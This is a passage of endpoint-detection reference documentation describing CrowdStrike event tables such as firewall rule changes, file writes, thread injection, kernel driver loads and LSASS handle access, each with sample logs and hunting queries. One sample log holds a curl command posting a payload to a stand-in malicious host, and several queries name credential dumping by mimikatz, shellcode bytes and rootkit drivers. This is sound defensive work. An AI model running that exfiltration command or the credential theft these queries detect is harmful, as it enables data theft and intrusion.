This table records events generated when a file is renamed on the endpoint. This event is typically sent as part of a detection. Monitoring file renames can help identify malicious activities such as file obfuscation, evasion techniques, or data manipulation.

---

### 3. Important Parameter Description

| Parameter      | Description                               | Platforms Affected |
|----------------|-------------------------------------------|--------------------|
| SourceFileName | The file's original name.                 | All                |
| TargetFileName | The file's new name after the rename operation. | All                |

---

### 4. Sample Log Example

```json
{
  "SourceFileName": "C:\\Users\\user\\Documents\\old_report.docx",
  "TargetFileName": "C:\\Users\\user\\Documents\\final_report.docx"
}
```
---

### 5. Example Queries
```xql
// Find all file rename events
event_simpleName=FileRenameInfo

// Find file rename events for a specific source file name
event_simpleName=FileRenameInfo SourceFileName="*temp_file.txt*"

// Find file rename events where a file was renamed to a suspicious extension
event_simpleName=FileRenameInfo TargetFileName="*.exe" SourceFileName!="*.exe"

// Investigate file renames where the original file was in a sensitive directory
event_simpleName=FileRenameInfo SourceFileName="*C:\\Windows\\System32\\*"
```
---
## FirewallDeleteRule Table: Firewall Rule Deletion Event

### 1. Table Name
**FirewallDeleteRule**

---

### 2. Table Usage
A firewall rule has been deleted, such as removing a rule preventing inbound RDP connections. The data will indicate the initial process (command-line tool, custom utility, or GUI application) or remote address/hostname that resulted in this action. This event is useful for detecting unauthorized network configuration changes.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| FirewallRuleId | The unique identifier of the firewall rule that was deleted. | Windows Only |
| UserName | The name of the user who initiated the firewall rule deletion. | Windows Only |
| RpcClientProcessId | The ProcessId corresponding to the RPC client that requested the deletion. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "FirewallRuleId": "{C5DD2D2C-7901-4A5D-B5F5-1D8C8B7E3F0F}",
  "RpcNestingLevel": 0,
  "InterfaceGuid": "0x81bb7a364498f135ad3298f038001003",
  "InterfaceVersion": 1.0,
  "RpcOpNum": 31,
  "RpcClientProcessId": 1234,
  "RpcClientThreadId": 5678,
  "ContextProcessId": 9876,
  "RemoteAddressIP4": "192.168.1.100",
  "RemoteAddressIP6": "::1",
  "AuthenticationId": 999,
  "TokenType": 1,
  "UserName": "Administrator"
}
```
---

### 5. Example Queries
```xql
// Find all firewall rule deletion events for a specific rule ID
event_simpleName=FirewallDeleteRule FirewallRuleId="{C5DD2D2C-7901-4A5D-B5F5-1D8C8B7E3F0F}"

// Find firewall rule deletion events initiated by a specific user
event_simpleName=FirewallDeleteRule UserName="Administrator"

// Find firewall rule deletion events requested by a specific RPC client process ID
event_simpleName=FirewallDeleteRule RpcClientProcessId=1234
```
---
## FirewallSetRule Table: Firewall Rule Set Event

### 1. Table Name
**FirewallSetRule**

---

### 2. Table Usage
This table records events when a firewall rule is created or modified on a Windows host. This is crucial for monitoring network security configurations, detecting unauthorized changes that could expose systems, or identifying the establishment of persistence by malicious actors.

---

### 3. Important Parameter Description

| Parameter          | Description                                                                                  | Platforms Affected |
|--------------------|----------------------------------------------------------------------------------------------|--------------------|
| FirewallRule       | The full definition of the firewall rule that was created or modified.                       | Windows Only       |
| UserName           | The user account under which the process that set the firewall rule is running.              | Windows Only       |
| RpcClientProcessId | The ProcessId corresponding to the RPC client that initiated the firewall rule modification. | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "FirewallRule": "Name: Allow Inbound RDP, Direction: In, Action: Allow, Protocol: TCP, LocalPort: 3389",
  "UserName": "NT AUTHORITY\\SYSTEM",
  "RpcClientProcessId": "884"
}
```
### 5. Example Queries
```xql
// Find all firewall rule set events
event_simpleName=FirewallSetRule

// Find firewall rule set events that allow inbound RDP connections
event_simpleName=FirewallSetRule FirewallRule="*Allow Inbound RDP*"

// Investigate firewall rule changes made by a specific user
event_simpleName=FirewallSetRule UserName="*Administrator*"

// Find firewall rule set events initiated by a suspicious RPC client process ID
event_simpleName=FirewallSetRule RpcClientProcessId="1234"
```
---
## GenericFileWritten Table: Generic File Written Event

### 1. Table Name
**GenericFileWritten**

---

### 2. Table Usage
This table records events when a process finishes writing to a file that does not match a more specific `*FileWritten` event. These events are currently generated for removable disks only. This is useful for capturing write activity to miscellaneous file types, especially on removable media, which can be an indicator of data transfer or suspicious file drops.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| ContextBaseFileName | The base name of the context file that was written.                                          | All                |
| TargetFileName      | The resulting file name that was written.                                                    | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                                 | All                |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                              | Windows Only       |
| UserName            | The user account associated with the process that wrote the file.                            | All                |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "report.dat",
  "TargetFileName": "D:\\backups\\report.dat",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": true,
  "FileOperatorSid": "S-1-5-21-12345-67890-...",
  "UserName": "johndoe"
}
```
---

### 5. Example Queries
```xql
// Find all generic file write events to removable disks
event_simpleName=GenericFileWritten IsOnRemovableDisk=true

// Find generic file writes where the target file name indicates a potential sensitive file
event_simpleName=GenericFileWritten TargetFileName="*passwords.txt*"

// Investigate generic file writes by a specific user to removable media
event_simpleName=GenericFileWritten UserName="malicious_user" IsOnRemovableDisk=true

// Find generic file writes on a network drive (Windows only)
event_simpleName=GenericFileWritten IsOnNetwork=true

// Find generic file writes by a specific file operator SID (Windows only)
event_simpleName=GenericFileWritten FileOperatorSid="S-1-5-18"
```
---
## GifFileWritten Table: GIF File Written Event

### 1. Table Name
**GifFileWritten**

---

### 2. Table Usage
This table records events when a process is done writing a GIF image file. Monitoring these events can be useful for tracking image generation, potential data manipulation, or the creation of visual artifacts by applications, especially in the context of web content or multimedia.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| ContextBaseFileName | The base name of the context file that was written.                          | All                |
| TargetFileName      | The resulting file name that was downloaded.                                 | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                 | All                |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                    | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "animated_banner.gif",
  "TargetFileName": "C:\\Users\\Public\\Pictures\\animated_banner.gif",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-9876543210-..."
}
```
---

### 5. Example Queries
```xql
// Find all GIF files written to a network drive (Windows only)
event_simpleName=GifFileWritten IsOnNetwork=true

// Find GIF files written to a removable disk
event_simpleName=GifFileWritten IsOnRemovableDisk=true

// Investigate GIF file writes by a specific file operator SID (Windows only)
event_simpleName=GifFileWritten FileOperatorSid="S-1-5-21-9876543210-*"

// Find GIF files with a specific target file name pattern
event_simpleName=GifFileWritten TargetFileName="*thumbnail*.gif"

// Find GIF files based on their context base file name
event_simpleName=GifFileWritten ContextBaseFileName="loading_spinner.gif"
```
---
## GzipFileWritten Table: Gzip File Written Event

### 1. Table Name
**GzipFileWritten**

---

### 2. Table Usage
This table records events when a file with a Gzip image header is written to the system. Gzip is a common compression format, and monitoring these events can help detect data compression activities, exfiltration attempts, or malware packaging across various operating systems.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/home/user/downloads/archive.gz",
  "ContextTimeStamp": "1722230400000"
}
```
---
### 5. Example Queries
```xql
// Find all Gzip files written with a specific target file name
event_simpleName=GzipFileWritten TargetFileName="*backup_data.gz*"

// Find Gzip files written to a temporary directory
event_simpleName=GzipFileWritten TargetFileName="*\\temp\\*.gz"

// Identify recently written Gzip archives
event_simpleName=GzipFileWritten TargetFileName="*.gz"
```
---
## HostedServiceStarted Table: Hosted Service Start Event

### 1. Table Name
**HostedServiceStarted**

---

### 2. Table Usage
This event is generated when a hosted service, which is a service that runs inside a generic `svchost.exe` process, is started by the Service Control Manager (SCM). Attackers often create malicious services that are loaded by the legitimate `svchost.exe` to establish persistence and conceal their activities. Monitoring this event is crucial for detecting such persistence techniques.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ServiceDisplayName | The display name of the hosted service that was started. | Windows Only |
| ImageFileName | The full path to the service's DLL file that is loaded into the `svchost.exe` process. | Windows Only |
| UserName | The user account under which the service is configured to run. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the process that made the RPC call to start the service. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ServiceDisplayName": "Malicious Windows Update Service",
  "ImageFileName": "C:\\Windows\\Temp\\malware.dll",
  "UserName": "LocalSystem",
  "RpcClientProcessId": "784"
}
```
---

### 5. Example Queries
```xql
// Find all hosted service start events
event_simpleName=HostedServiceStarted

// Hunt for hosted services loading DLLs from unusual locations
event_simpleName=HostedServiceStarted ImageFileName IN ("*\\Temp\\*", "*\\Users\\Public\\*")

// Find hosted services with suspicious display names
event_simpleName=HostedServiceStarted ServiceDisplayName IN ("*malware*", "*backdoor*")

// Investigate which process is responsible for starting a specific service
event_simpleName=HostedServiceStarted ServiceDisplayName="SuspiciousSvc" | table RpcClientProcessId, ImageFileName
```
---
## HttpRequest Table: HTTP Request Event

### 1. Table Name
**HttpRequest**

---

### 2. Table Usage
This table records outbound HTTP requests initiated by processes on Linux and macOS systems. It provides details about the request, including the method, host, path, and originating process, which is useful for monitoring web activity, detecting C2 communications, or identifying data exfiltration.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| HttpPath | The path part of the HTTP request URL. | Linux, macOS |
| HttpHost | The host (domain name or IP address) to which the HTTP request was sent. | Linux, macOS |
| HttpMethod | The HTTP method used for the request (e.g., GET, POST, PUT). | Linux, macOS |
| RemoteAddressIP4 | The IPv4 address of the remote host to which the connection was made. | Linux, macOS |
| RemotePort | The remote port number used for the connection. | Linux, macOS |
| ImageFileName | The full path to an executable (PE) file. The context of this field provides more information as to its meaning. For ProcessRollup2 events, this is the full path to the main executable for the created process. | Linux, macOS |
| CommandLine | The command line used to create this process. May be empty in some circumstances. | Linux, macOS |

---

### 4. Sample Log Example

```json
{
  "HttpPath": "/api/v1/data",
  "HttpHost": "malicious.example.com",
  "HttpMethod": "POST",
  "RemoteAddressIP4": "192.0.2.100",
  "RemotePort": "443",
  "ImageFileName": "/usr/bin/curl",
  "CommandLine": "curl -X POST [https://malicious.example.com/api/v1/data](https://malicious.example.com/api/v1/data) -d @payload.json"
}
```
---

### 5. Example Queries
```xql
// Find all HTTP POST requests to a specific host
event_simpleName=HttpRequest HttpMethod=HTTP_METHOD_POST HttpHost="malicious.example.com"

// Identify HTTP requests originating from a suspicious image file
event_simpleName=HttpRequest ImageFileName="/usr/local/bin/backdoor_app"

// Find HTTP requests to a specific IP address on a given port
event_simpleName=HttpRequest RemoteAddressIP4="192.0.2.100" RemotePort="8080"

// Search for HTTP requests with specific keywords in the path or command line
event_simpleName=HttpRequest HttpPath="*exfil*" OR CommandLine="*upload_data*"

// Discover HTTP requests where HttpHost contains an unusual domain pattern
event_simpleName=HttpRequest HttpHost="*.xyz" OR HttpHost="*.top"
```
---
## ImgExtensionFileWritten Table: File Written Event

### 1. Table Name
**ImgExtensionFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an IMG disk image file (`.img`). Attackers use IMG files, similar to ISO files, to deliver malware. Because these files are mounted as a drive when opened, they can bypass certain security controls, making them a popular container for malicious executables, scripts, and LNK files.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written (the full path of the .img file). | Windows Only |
| ContextBaseFileName | The base name of the context file (the name of the .img file itself). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\Urgent_Invoice.img",
  "ContextBaseFileName": "Urgent_Invoice.img"
}
```
---

### 5. Example Queries
```xql
// Find all IMG files written to disk
event_simpleName=ImgExtensionFileWritten TargetFileName="*.img"

// Hunt for IMG files written to common download or temp directories
event_simpleName=ImgExtensionFileWritten TargetFileName IN ("*\\Downloads\\*", "*\\Temp\\*")

// Find IMG files with potentially suspicious names
event_simpleName=ImgExtensionFileWritten ContextBaseFileName IN ("*invoice*", "*urgent*", "*payment*")
```## InjectedThreadFromUnsignedModule Table: Thread Injection from Unsigned Module Event

### 1. Table Name
**InjectedThreadFromUnsignedModule**

---

### 2. Table Usage
This event is generated when a thread is injected into a process from an unsigned module on a Windows host. This is a highly suspicious activity and a common technique used by malware to execute malicious code within the address space of a legitimate process, thereby evading detection. This event combines details about the injection and the signature status of the source module.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetProcessId | The unique ID of the process into which the thread was injected. | Windows Only |
| TargetThreadModule | The module in the target process where the injected thread resides. | Windows Only |
| InjectedThreadFlag | A bitmask of flags providing context about the injected thread, such as `512` (START_ADDRESS_PRIVATE_MEM) indicating the thread starts in private memory. | Windows Only |
| UserThread | A flag indicating if the thread is a user thread. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": "3456",
  "TargetThreadModule": "C:\\Windows\\System32\\ntdll.dll",
  "InjectedThreadFlag": "512",
  "UserThread": "1"
}
```
---
### 5. Example Queries
```xql
// Find all thread injections from unsigned modules
event_simpleName=InjectedThreadFromUnsignedModule

// Hunt for injections into a specific target process ID
event_simpleName=InjectedThreadFromUnsignedModule TargetProcessId="1234"

// Find injections where the thread starts in private memory (InjectedThreadFlag=512), which is highly suspicious
event_simpleName=InjectedThreadFromUnsignedModule InjectedThreadFlag=512

// Investigate which modules in the target process are associated with the injected thread
event_simpleName=InjectedThreadFromUnsignedModule | table TargetProcessId, TargetThreadModule
```
---
## IsoExtensionFileWritten Table: File Written Event

### 1. Table Name
**IsoExtensionFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an ISO disk image file (`.iso`). Attackers increasingly use ISO files to deliver malware, often within phishing emails, because these files can bypass certain security controls. When a user mounts an ISO file, its contents appear as a virtual drive, making it a convenient container for malicious executables, scripts, and LNK files.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written (the full path of the .iso file). | Windows Only |
| ContextBaseFileName | The base name of the context file (the name of the .iso file itself). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\Urgent_Invoice.iso",
  "ContextBaseFileName": "Urgent_Invoice.iso"
}
```
---
### 5. Example Queries
```xql
// Find all ISO files written to disk
event_simpleName=IsoExtensionFileWritten TargetFileName="*.iso"

// Hunt for ISO files written to common download or temp directories
event_simpleName=IsoExtensionFileWritten TargetFileName IN ("*\\Downloads\\*", "*\\Temp\\*")

// Find ISO files with potentially suspicious names
event_simpleName=IsoExtensionFileWritten ContextBaseFileName IN ("*invoice*", "*urgent*", "*payment*")
```
---
## JarFileWritten Table: File Written Event

### 1. Table Name
**JarFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a Java Archive (.jar) file to disk. Attackers often use malicious JAR files to exploit vulnerabilities (such as Log4j) or to deploy cross-platform malware. Monitoring the creation of these files is crucial for investigating Java-based threats and potential exploitation attempts.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written (the full path of the .jar file). | All |
| ContextBaseFileName | The base name of the context file (the name of the .jar file itself). | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\Public\\Downloads\\log4j-exploit.jar",
  "ContextBaseFileName": "log4j-exploit.jar"
}
```
---

### 5. Example Queries
```xql
// Find all JAR files written to disk
event_simpleName=JarFileWritten TargetFileName="*.jar"

// Hunt for JAR files being written to suspicious locations like Temp or Public directories
event_simpleName=JarFileWritten TargetFileName IN ("*\\Temp\\*", "*\\Users\\Public\\*", "/tmp/*", "/var/tmp/*")

// Find JAR files with names that could indicate an exploit, such as for Log4j
event_simpleName=JarFileWritten ContextBaseFileName="*log4j*" OR ContextBaseFileName="*exploit*"
```
---
## JavaClassFileWritten Table: File Written Event

### 1. Table Name
**JavaClassFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a Java Class file (`.class`). Attackers may drop malicious Java classes on a system as part of an exploit chain or to execute malicious code using the Java Virtual Machine (JVM). Monitoring the creation of these files is useful for investigating Java-based threats and malware.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written (the path of the .class file). | All |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\AppData\\Local\\Temp\\Exploit.class",
  "ContextBaseFileName": "Exploit.class"
}
```


---

### 5. Example Queries
```xql
// Find all Java Class files written to disk
event_simpleName=JavaClassFileWritten TargetFileName="*.class"

// Hunt for Java Class files being written to suspicious locations like Temp or user profile directories
event_simpleName=JavaClassFileWritten TargetFileName IN ("*\\Temp\\*", "*\\AppData\\*")

// Find Java Class files with a potentially malicious name
event_simpleName=JavaClassFileWritten ContextBaseFileName="*Exploit*" OR ContextBaseFileName="*Shell*"
```
---
## JavaInjectedThread Table: Java Thread Injection Event

### 1. Table Name
**JavaInjectedThread**

---

### 2. Table Usage
This event is generated when a Java application injects a thread into another process on a Windows host. While this can be a legitimate behavior for some applications, it is also a technique used by malware, particularly in exploits targeting Java vulnerabilities, to execute malicious code within the context of another process. Monitoring this event is important for detecting potential Java-based exploits and malware.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetProcessId | The unique ID of the process into which the Java thread was injected. | Windows Only |
| InjectedThreadFlag | A bitmask of flags providing context about the injected thread, such as if the start address is in a known module or private memory. | Windows Only |
| UserThread | Indicates whether the thread is a user-mode thread. | Windows Only |
| ThreadStartBytes | The initial bytes of code at the start address of the injected thread. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": "4560",
  "InjectedThreadFlag": "512",
  "UserThread": "1",
  "ThreadStartBytes": "fc4883e4f0e8..."
}
```
---

### 5. Example Queries
```xql
// Find all instances of Java thread injection
event_simpleName=JavaInjectedThread

// Hunt for Java injecting a thread into a specific process, like a browser or system process
event_simpleName=JavaInjectedThread TargetProcessId="1234"

// Find injections where the thread starts in private memory (InjectedThreadFlag=512), which is highly suspicious
event_simpleName=JavaInjectedThread InjectedThreadFlag=512

// Investigate the initial bytes of an injected thread for known malicious shellcode patterns
event_simpleName=JavaInjectedThread ThreadStartBytes="*fc4883*"
```
---
## JpegFileWritten Table: File Written Event

### 1. Table Name
**JpegFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a JPEG image file. While JPEG is a very common image format, monitoring its creation can be useful in specific threat hunting scenarios, such as detecting the exfiltration of sensitive information via screenshots or identifying steganography, where attackers hide data within image files.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Pictures\\Screenshots\\screenshot-2023.jpg",
  "ContextBaseFileName": "screenshot-2023.jpg"
}
```
---
### 5. Example Queries
```xql
// Find all JPEG files written to disk
event_simpleName=JpegFileWritten TargetFileName IN ("*.jpg", "*.jpeg")

// Hunt for JPEG files being written to temporary or download directories
event_simpleName=JpegFileWritten TargetFileName IN ("*\\Temp\\*", "*\\Downloads\\*")

// Find JPEG files that might be screenshots
event_simpleName=JpegFileWritten ContextBaseFileName="*screenshot*"
```
---
## KernelModelLoadImage Table: Kernel Module Load Event

### 1. Table Name
**KernelModelLoadImage**

---

### 2. Table Usage
This event is generated when a kernel module (driver) is loaded on a Windows host. Monitoring the loading of kernel modules is critical for security, as attackers often use malicious or vulnerable drivers (rootkits) to escalate privileges, hide their presence, and gain deep control over the operating system.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the kernel module (driver file, typically `.sys`) that was loaded. | Windows Only |
| ImageModuleName | The name of the module. | Windows Only |
| ImageModuleAuthor | The author of the module, as specified in its properties. | Windows Only |
| ImageModuleDescription | A description of the module, as specified in its properties. | Windows Only |
| ModuleInitFlags | A bitmask field indicating the initialization flags of the module. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\drivers\\evil_rootkit.sys",
  "ImageModuleName": "evil_rootkit",
  "ImageModuleAuthor": "Malicious Actor",
  "ImageModuleDescription": "Suspicious Kernel Driver",
  "ModuleInitFlags": "0"
}
```

---

### 5. Example Queries
```xql
// Find all kernel module load events
event_simpleName=KernelModelLoadImage

// Hunt for kernel modules loaded from non-standard directories like Temp or user profiles
event_simpleName=KernelModelLoadImage ImageFileName IN ("*\\Temp\\*", "*\\Users\\*")

// Find kernel modules with a suspicious name
event_simpleName=KernelModelLoadImage ImageModuleName="*rootkit*" OR ImageModuleName="*hide*"

// Search for modules with a suspicious description or author
event_simpleName=KernelModelLoadImage ImageModuleDescription="*bypass*" OR ImageModuleAuthor="*hacker*"

// Investigate a specific driver being loaded
event_simpleName=KernelModelLoadImage ImageFileName="*\\evil_driver.sys"
```
---
## KernelServiceStarted Table: Kernel Service Start Event

### 1. Table Name
**KernelServiceStarted**

---

### 2. Table Usage
This event is generated when a kernel service (driver) is started on a Windows host, either locally or remotely. Attackers may install and start malicious drivers to gain kernel-level privileges, which allows them to hide their presence (rootkit functionality) or tamper with the operating system and security products. Monitoring this event is critical for detecting the loading of potentially malicious or unauthorized drivers.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ServiceDisplayName | The display name of the kernel service that was started. | Windows Only |
| ImageFileName | The full path to the driver file (e.g., `.sys` file) associated with the service. | Windows Only |
| ImageBaseName | The base name of the driver file. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the process that made the RPC call to start the service. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ServiceDisplayName": "Malicious Kernel Driver",
  "ImageFileName": "C:\\Windows\\System32\\drivers\\evil.sys",
  "ImageBaseName": "evil.sys",
  "RpcClientProcessId": "784"
}
```

---

### 5. Example Queries
```xql
// Find all kernel service start events
event_simpleName=KernelServiceStarted

// Hunt for drivers being loaded from unusual locations
event_simpleName=KernelServiceStarted ImageFileName!="C:\\Windows\\System32\\drivers\\*"

// Find kernel services with suspicious display names
event_simpleName=KernelServiceStarted ServiceDisplayName="*rootkit*" OR ServiceDisplayName="*hide*"

// Investigate which process is responsible for starting a specific kernel service
event_simpleName=KernelServiceStarted ServiceDisplayName="MySuspiciousDriver" | table RpcClientProcessId, ImageFileName
```
---
## LnkFileWritten Table: File Written Event

### 1. Table Name
**LnkFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a Windows Shortcut File (.lnk). Attackers frequently use LNK files for persistence and initial execution, often by placing them in startup folders or sending them as phishing attachments. These malicious shortcuts can be crafted to execute arbitrary commands, PowerShell scripts, or download further malware.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written (the path of the .lnk file). | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "Update.lnk"
}
```

---

### 5. Example Queries
```xql
// Find all LNK files written to disk
event_simpleName=LnkFileWritten TargetFileName="*.lnk"

// Hunt for LNK files being written to user Startup folders for persistence
event_simpleName=LnkFileWritten TargetFileName="*\\Start Menu\\Programs\\Startup\\*.lnk"

// Find LNK files written to a network drive (Windows only)
event_simpleName=LnkFileWritten IsOnNetwork=true

// Find LNK files written to removable media, which could be used for physical attacks
event_simpleName=LnkFileWritten IsOnRemovableDisk=true

// Investigate LNK file writes by a specific file operator SID (Windows only)
event_simpleName=LnkFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"
```
---
## LsassHandleFromUnsignedModule Table: LSASS Handle from Unsigned Module Event

### 1. Table Name
**LsassHandleFromUnsignedModule**

---

### 2. Table Usage
This event is generated when a handle is created to the LSASS (Local Security Authority Subsystem Service) process from an unsigned module. LSASS stores credentials for active user sessions. Attackers, particularly credential theft tools like Mimikatz, often attempt to access LSASS memory to dump these credentials. A handle being opened by an unsigned (and therefore untrusted) module is a very strong indicator of a credential dumping attempt.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the unsigned module (e.g., a DLL) that created the handle to LSASS. | Windows Only |
| TargetProcessId | The unique ID of the process to which the handle was created. For this event, it will be the process ID of LSASS. | Windows Only |
| FileSigningTime | The timestamp of the module's digital signature. For an unsigned module, this will typically be zero or null. | Windows Only |
| SignInfoFlags | A bitmask indicating the signature status of the module. A value of `512` (0x200) indicates the module has no signature. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\mimikatz.dll",
  "TargetProcessId": "712",
  "FileSigningTime": "0",
  "SignInfoFlags": "512"
}
```
---

### 5. Example Queries
```xql
// Find all instances of an unsigned module creating a handle to LSASS
event_simpleName=LsassHandleFromUnsignedModule

// Hunt for specific unsigned modules by name that are accessing LSASS
event_simpleName=LsassHandleFromUnsignedModule ImageFileName="*\\mimikatz.dll"

// Find all modules explicitly flagged as having no signature that are accessing LSASS
event_simpleName=LsassHandleFromUnsignedModule SignInfoFlags=512

// Investigate unsigned modules from temporary directories that are accessing LSASS
event_simpleName=LsassHandleFromUnsignedModule ImageFileName IN ("*\\Temp\\*", "*\\Users\\Public\\*")
```
---
## Crowdstrike Table: MSDocxFileWritten

### 1. Table Name

**MSDocxFileWritten**

---

### 2. Table Usage

This table records events when a process completes writing an MS Office Open XML Document (DOCX) file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| FsMagic | File system magic number. | Linux |
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| MSOfficeSubType | Values: UNKNOWN (0), OLECFB (1), OOXML (2). | All |
| FileCategory | Values: OTHER (0), ARCHIVES (1), OFFICE_DOCUMENTS (2), MULTIMEDIA_FILES (3), DESIGN_FILES (4), SOURCE_CODE (5), EXECUTABLE_FILES (6), VIRTUAL_MACHINE_FILES (7), EMAIL_FILES (8), DATA_AND_LOGS (9), ENCRYPTED (10). | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows |

---

### 4. Sample Log Example

```json
{
  "FsMagic": 61267,
  "ContextBaseFileName": "report.docx",
  "TargetFileName": "C:\\Users\\user\\Documents\\report.docx",
  "MSOfficeSubType": 2,
  "FileCategory": 2,
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-..."
}
```

---

### 5. Example Queries

```xql
// Find all MS Docx files written with a specific target file name
event_simpleName=MSDocxFileWritten TargetFileName="*confidential_document.docx*"

// Find MS Docx files written to a network drive (Windows only)
event_simpleName=MSDocxFileWritten IsOnNetwork=true

// Find MS Docx files written to a removable disk
event_simpleName=MSDocxFileWritten IsOnRemovableDisk=true

// Investigate MS Docx file writes by a specific file operator SID (Windows only)
event_simpleName=MSDocxFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find MS Docx files based on their context base file name
event_simpleName=MSDocxFileWritten ContextBaseFileName="financial_statement.docx"

// Find MS Docx files that are of OOXML subtype
event_simpleName=MSDocxFileWritten MSOfficeSubType=2

// Find MS Docx files categorized as Office Documents
event_simpleName=MSDocxFileWritten FileCategory=2

// Find MS Docx files on a specific file system magic (Linux only)
event_simpleName=MSDocxFileWritten FsMagic=61267
```

---
## Crowdstrike Table: MSPptxFileWritten

### 1. Table Name

**MSPptxFileWritten**

---

### 2. Table Usage

This table records events when a process completes writing an MS Office Open XML Presentation (PPTX) file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| FsMagic | File system magic number. | Linux |
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| MSOfficeSubType | Values: UNKNOWN (0), OLECFB (1), OOXML (2). | All |
| FileCategory | Values: OTHER (0), ARCHIVES (1), OFFICE_DOCUMENTS (2), MULTIMEDIA_FILES (3), DESIGN_FILES (4), SOURCE_CODE (5), EXECUTABLE_FILES (6), VIRTUAL_MACHINE_FILES (7), EMAIL_FILES (8), DATA_AND_LOGS (9), ENCRYPTED (10). | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
